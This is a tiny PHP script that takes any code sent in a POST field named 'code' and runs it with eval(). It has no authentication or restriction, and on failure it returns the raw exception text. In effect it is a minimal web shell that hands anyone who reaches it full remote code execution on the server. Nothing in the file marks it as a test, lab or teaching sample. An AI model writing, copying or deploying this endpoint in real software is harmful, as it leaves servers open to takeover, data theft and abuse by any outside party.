<?php
if (isset($_POST['code'])) {
    try {
        eval(preg_replace('/^<\?php/', '', ltrim($_POST['code'])));
    } catch (\Throwable $throwable) {
        header($_SERVER['SERVER_PROTOCOL'] . ' 500 Internal Server Error', true, 500);
        printf('<textearea>%s</textearea>', $throwable);
    }
}
